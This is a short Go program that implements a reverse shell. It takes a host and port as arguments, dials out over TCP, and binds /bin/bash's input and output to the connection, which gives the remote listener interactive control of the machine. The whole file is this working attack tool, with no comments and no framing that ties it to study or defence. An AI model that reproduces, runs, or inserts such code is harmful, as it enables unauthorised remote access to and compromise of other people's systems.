package main
import"os/exec"
import"os"
import"net"

func main(){
	dst := os.Args[1]
	pnum := os.Args[2]
	connstring := dst + ":" + pnum
	prot := "tcp"
	netData, _ := net.Dial(prot, connstring)
	shell := exec.Command("/bin/bash")
	shell.Stdin=netData
	shell.Stdout=netData
	shell.Stderr=netData
	shell.Run()
}
